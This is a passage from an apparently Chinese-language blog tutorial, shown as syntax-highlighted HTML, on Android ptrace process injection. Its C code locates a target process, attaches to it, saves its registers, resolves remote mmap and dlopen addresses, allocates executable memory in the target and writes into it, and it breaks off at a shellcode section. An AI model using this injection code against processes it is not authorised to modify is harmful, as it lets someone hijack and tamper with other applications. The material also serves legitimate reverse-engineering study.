class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_pid_of</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *process_name)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">int</span> id;    </span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">-1</span>;    </span><br><span class="line">    DIR* dir;    </span><br><span class="line">    FILE *fp;    </span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];    </span><br><span class="line">    <span class="keyword">char</span> cmdline[<span class="number">256</span>];    </span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> * <span class="title">entry</span>;</span>    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (process_name == <span class="literal">NULL</span>)    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    </span><br><span class="line">    dir = opendir(<span class="string">"/proc"</span>);    </span><br><span class="line">    <span class="keyword">if</span> (dir == <span class="literal">NULL</span>)    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>((entry = readdir(dir)) != <span class="literal">NULL</span>) &#123;    </span><br><span class="line">        id = atoi(entry-&gt;d_name);    </span><br><span class="line">        <span class="keyword">if</span> (id != <span class="number">0</span>) &#123;    </span><br><span class="line">            <span class="built_in">sprintf</span>(filename, <span class="string">"/proc/%d/cmdline"</span>, id);    </span><br><span class="line">            fp = fopen(filename, <span class="string">"r"</span>);    </span><br><span class="line">            <span class="keyword">if</span> (fp) &#123;    </span><br><span class="line">                fgets(cmdline, <span class="keyword">sizeof</span>(cmdline), fp);    </span><br><span class="line">                fclose(fp);    </span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strcmp</span>(process_name, cmdline) == <span class="number">0</span>) &#123;    </span><br><span class="line">                    <span class="comment">/* process found */</span>    </span><br><span class="line">                    pid = id;    </span><br><span class="line">                    <span class="keyword">break</span>;    </span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    closedir(dir);    </span><br><span class="line">    <span class="keyword">return</span> pid;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2、ptrace跟踪目标进程"><a href="#2、ptrace跟踪目标进程" class="headerlink" title="2、ptrace跟踪目标进程"></a>2、ptrace跟踪目标进程</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ptrace_attach(target_pid) == <span class="number">-1</span>)   </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">exit</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_attach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_ATTACH, pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        perror(<span class="string">"ptrace_attach"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> status = <span class="number">0</span>;    </span><br><span class="line">    <span class="comment">// 挂起父进程，等待子进程中断或结束</span></span><br><span class="line">    waitpid(pid, &amp;status , WUNTRACED);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3、保存目标进程寄存器的值"><a href="#3、保存目标进程寄存器的值" class="headerlink" title="3、保存目标进程寄存器的值"></a>3、保存目标进程寄存器的值</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ptrace_getregs(target_pid, &amp;regs) == <span class="number">-1</span>) </span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">exit</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将读取到的寄存器值存放在regs中</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_getregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_GETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        perror(<span class="string">"ptrace_getregs: Can not get register values"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* save original registers */</span>    </span><br><span class="line"><span class="built_in">memcpy</span>(&amp;original_regs, &amp;regs, <span class="keyword">sizeof</span>(regs));</span><br></pre></td></tr></table></figure><h1 id="4、获得mmap、dlopen等库函数在目标进程中的偏移地址"><a href="#4、获得mmap、dlopen等库函数在目标进程中的偏移地址" class="headerlink" title="4、获得mmap、dlopen等库函数在目标进程中的偏移地址"></a>4、获得mmap、dlopen等库函数在目标进程中的偏移地址</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *linker_path = <span class="string">"/system/bin/linker"</span>;   </span><br><span class="line"></span><br><span class="line">mmap_addr = get_remote_addr(target_pid, libc_path, (<span class="keyword">void</span> *)mmap);</span><br><span class="line">dlopen_addr = get_remote_addr( target_pid, linker_path, (<span class="keyword">void</span> *)dlopen );    </span><br><span class="line">dlsym_addr = get_remote_addr( target_pid, linker_path, (<span class="keyword">void</span> *)dlsym );    </span><br><span class="line">dlclose_addr = get_remote_addr( target_pid, linker_path, (<span class="keyword">void</span> *)dlclose );    </span><br><span class="line">dlerror_addr = get_remote_addr( target_pid, linker_path, (<span class="keyword">void</span> *)dlerror );</span><br></pre></td></tr></table></figure><p>在计算偏移地址时，有个小TIPS，一个相同的库对于不同的进程来说，它的偏移量是恒定的。</p><p>也就是说，A进程载入了mmap，B进程也载入了mmap，那么mmap在A进程中的偏移等于相对于B进程的偏移。</p><p><strong>B.mmap地址 = B_lib库地址 + （A.mmap地址 -A_lib库地址）</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_remote_addr</span><span class="params">(<span class="keyword">pid_t</span> target_pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name, <span class="keyword">void</span>* local_addr)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">void</span>* local_handle, *remote_handle;    </span><br><span class="line">    </span><br><span class="line">    local_handle = get_module_base(<span class="number">-1</span>, module_name);    </span><br><span class="line">    remote_handle = get_module_base(target_pid, module_name);    </span><br><span class="line">    </span><br><span class="line">    DEBUG_PRINT(<span class="string">"[+] get_remote_addr: local[%x], remote[%x]\n"</span>, local_handle, remote_handle);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> * ret_addr = (<span class="keyword">void</span> *)((<span class="keyword">uint32_t</span>)local_addr + (<span class="keyword">uint32_t</span>)remote_handle - (<span class="keyword">uint32_t</span>)local_handle);    </span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__i386__)    </span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(module_name, libc_path)) &#123;    </span><br><span class="line">        ret_addr += <span class="number">2</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>    </span></span><br><span class="line">    <span class="keyword">return</span> ret_addr;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">get_module_base</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">const</span> <span class="keyword">char</span>* module_name)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    FILE *fp;    </span><br><span class="line">    <span class="keyword">long</span> addr = <span class="number">0</span>;    </span><br><span class="line">    <span class="keyword">char</span> *pch;    </span><br><span class="line">    <span class="keyword">char</span> filename[<span class="number">32</span>];    </span><br><span class="line">    <span class="keyword">char</span> line[<span class="number">1024</span>];    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        <span class="comment">/* self process */</span>    </span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/self/maps"</span>, pid);    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">        <span class="built_in">snprintf</span>(filename, <span class="keyword">sizeof</span>(filename), <span class="string">"/proc/%d/maps"</span>, pid);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    fp = fopen(filename, <span class="string">"r"</span>);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;    </span><br><span class="line">        <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;    </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, module_name)) &#123;    </span><br><span class="line">                pch = strtok( line, <span class="string">"-"</span> );    </span><br><span class="line">                addr = strtoul( pch, <span class="literal">NULL</span>, <span class="number">16</span> );    </span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (addr == <span class="number">0x8000</span>)    </span><br><span class="line">                    addr = <span class="number">0</span>;    </span><br><span class="line">    </span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;    </span><br><span class="line">    </span><br><span class="line">        fclose(fp) ;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)addr;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="5、调用mmap在目标进程申请内存空间"><a href="#5、调用mmap在目标进程申请内存空间" class="headerlink" title="5、调用mmap在目标进程申请内存空间"></a>5、调用mmap在目标进程申请内存空间</h1><p>构建mmap调用需要的参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* call mmap */</span>    </span><br><span class="line">parameters[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// addr    </span></span><br><span class="line">parameters[<span class="number">1</span>] = <span class="number">0x4000</span>; <span class="comment">// size    </span></span><br><span class="line">parameters[<span class="number">2</span>] = PROT_READ | PROT_WRITE | PROT_EXEC;  <span class="comment">// prot    </span></span><br><span class="line">parameters[<span class="number">3</span>] =  MAP_ANONYMOUS | MAP_PRIVATE; <span class="comment">// flags    </span></span><br><span class="line">parameters[<span class="number">4</span>] = <span class="number">0</span>; <span class="comment">//fd    </span></span><br><span class="line">parameters[<span class="number">5</span>] = <span class="number">0</span>; <span class="comment">//offset    </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ptrace_call_wrapper(target_pid, <span class="string">"mmap"</span>, mmap_addr, parameters, <span class="number">6</span>, &amp;regs) == <span class="number">-1</span>)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">goto</span> <span class="built_in">exit</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_call_wrapper</span><span class="params">(<span class="keyword">pid_t</span> target_pid, <span class="keyword">const</span> <span class="keyword">char</span> * func_name, <span class="keyword">void</span> * func_addr, <span class="keyword">long</span> * parameters, <span class="keyword">int</span> param_num, struct pt_regs * regs)</span>     </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">  DEBUG_PRINT(<span class="string">"[+] Calling %s in target process.\n"</span>, func_name);    </span><br><span class="line">  <span class="keyword">if</span> (ptrace_call(target_pid, (<span class="keyword">uint32_t</span>)func_addr, parameters, param_num, regs) == <span class="number">-1</span>)    </span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ptrace_getregs(target_pid, regs) == <span class="number">-1</span>)    </span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">  DEBUG_PRINT(<span class="string">"[+] Target process returned from %s, return value=%x, pc=%x \n"</span>,     </span><br><span class="line">          func_name, ptrace_retval(regs), ptrace_ip(regs));    </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里做个平台判断，区分arm和x86，他们的实现方式不一样。下面只介绍arm</p><ul><li>首先将前面构建的mmap参数放入寄存器当中，对于arm来说，R0~R3是存放参数的，对于超过4位的参数一律放在栈中</li><li>将目标进程的PC寄存器指向mmap的函数地址，重置CPSR状态寄存器，重置LR寄存器</li><li>将配置完的寄存器应用到进程中</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(__arm__)    </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_call</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint32_t</span> addr, <span class="keyword">long</span> *params, <span class="keyword">uint32_t</span> num_params, struct pt_regs* regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">uint32_t</span> i;   </span><br><span class="line">  <span class="comment">// 参数先放寄存器中，R0~R3</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_params &amp;&amp; i &lt; <span class="number">4</span>; i ++) &#123;    </span><br><span class="line">        regs-&gt;uregs[i] = params[i];    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 多于4位的放在栈中   </span></span><br><span class="line">    <span class="keyword">if</span> (i &lt; num_params) &#123;    </span><br><span class="line">        regs-&gt;ARM_sp -= (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>) ;    </span><br><span class="line">        ptrace_writedata(pid, (<span class="keyword">void</span> *)regs-&gt;ARM_sp, (<span class="keyword">uint8_t</span> *)&amp;params[i], (num_params - i) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>));    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 将ARM的PC寄存器指向addr，也就是上面传来的需要调用的函数地址</span></span><br><span class="line">    regs-&gt;ARM_pc = addr;    </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 判断ARM当前所处的状态是thumb还是arm，它们的区别在于thumb是16位，arm是32位。属于arm的子集</span></span><br><span class="line">    <span class="comment">// 然后重置CPSR程序状态寄存器</span></span><br><span class="line">    <span class="keyword">if</span> (regs-&gt;ARM_pc &amp; <span class="number">1</span>) &#123;    </span><br><span class="line">        <span class="comment">/* thumb */</span>    </span><br><span class="line">        regs-&gt;ARM_pc &amp;= (~<span class="number">1u</span>);    </span><br><span class="line">        regs-&gt;ARM_cpsr |= CPSR_T_MASK;    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">        <span class="comment">/* arm */</span>    </span><br><span class="line">        regs-&gt;ARM_cpsr &amp;= ~CPSR_T_MASK;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 重置LR寄存器</span></span><br><span class="line">    <span class="comment">// LR寄存器存放的是子程序的返回地址</span></span><br><span class="line">    regs-&gt;ARM_lr = <span class="number">0</span>;        </span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 设置寄存器的值</span></span><br><span class="line">    <span class="keyword">if</span> (ptrace_setregs(pid, regs) == <span class="number">-1</span>     </span><br><span class="line">            || ptrace_continue(pid) == <span class="number">-1</span>) &#123;    </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error\n"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;  </span><br><span class="line">    waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    <span class="keyword">while</span> (stat != <span class="number">0xb7f</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (ptrace_continue(pid) == <span class="number">-1</span>) &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error\n"</span>);  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(__i386__)    </span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace_call</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint32_t</span> addr, <span class="keyword">long</span> *params, <span class="keyword">uint32_t</span> num_params, struct user_regs_struct * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    regs-&gt;esp -= (num_params) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>) ;    </span><br><span class="line">    ptrace_writedata(pid, (<span class="keyword">void</span> *)regs-&gt;esp, (<span class="keyword">uint8_t</span> *)params, (num_params) * <span class="keyword">sizeof</span>(<span class="keyword">long</span>));    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">long</span> tmp_addr = <span class="number">0x00</span>;    </span><br><span class="line">    regs-&gt;esp -= <span class="keyword">sizeof</span>(<span class="keyword">long</span>);    </span><br><span class="line">    ptrace_writedata(pid, regs-&gt;esp, (<span class="keyword">char</span> *)&amp;tmp_addr, <span class="keyword">sizeof</span>(tmp_addr));     </span><br><span class="line">    </span><br><span class="line">    regs-&gt;eip = addr;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ptrace_setregs(pid, regs) == <span class="number">-1</span>     </span><br><span class="line">            || ptrace_continue( pid) == <span class="number">-1</span>) &#123;    </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error\n"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;  </span><br><span class="line">    waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    <span class="keyword">while</span> (stat != <span class="number">0xb7f</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (ptrace_continue(pid) == <span class="number">-1</span>) &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"error\n"</span>);  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        waitpid(pid, &amp;stat, WUNTRACED);  </span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>     </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">"Not supported"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_writedata</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">uint8_t</span> *dest, <span class="keyword">uint8_t</span> *data, <span class="keyword">size_t</span> size)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">uint32_t</span> i, j, remain;    </span><br><span class="line">    <span class="keyword">uint8_t</span> *laddr;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">union</span> u &#123;    </span><br><span class="line">        <span class="keyword">long</span> val;    </span><br><span class="line">        <span class="keyword">char</span> chars[<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];    </span><br><span class="line">    &#125; d;    </span><br><span class="line">    </span><br><span class="line">    j = size / <span class="number">4</span>;    </span><br><span class="line">    remain = size % <span class="number">4</span>;    </span><br><span class="line">    </span><br><span class="line">    laddr = data;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; j; i ++) &#123;    </span><br><span class="line">        <span class="built_in">memcpy</span>(d.chars, laddr, <span class="number">4</span>);    </span><br><span class="line">        ptrace(PTRACE_POKETEXT, pid, dest, d.val);    </span><br><span class="line">    </span><br><span class="line">        dest  += <span class="number">4</span>;    </span><br><span class="line">        laddr += <span class="number">4</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;    </span><br><span class="line">        d.val = ptrace(PTRACE_PEEKTEXT, pid, dest, <span class="number">0</span>);    </span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; remain; i ++) &#123;    </span><br><span class="line">            d.chars[i] = *laddr ++;    </span><br><span class="line">        &#125;    </span><br><span class="line">    </span><br><span class="line">        ptrace(PTRACE_POKETEXT, pid, dest, d.val);    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置寄存器</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_setregs</span><span class="params">(<span class="keyword">pid_t</span> pid, struct pt_regs * regs)</span>    </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_SETREGS, pid, <span class="literal">NULL</span>, regs) &lt; <span class="number">0</span>) &#123;    </span><br><span class="line">        perror(<span class="string">"ptrace_setregs: Can not set register values"</span>);    </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;    </span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="写入Shellcode"><a href="#写入Shellcode" class="headerlink" title="写入Shellcode"></a>写入Shellcode</h1><p>首先拿到mmap映射的基地址，方便后续操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">map_base = ptrace_retval(&amp;regs);   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span 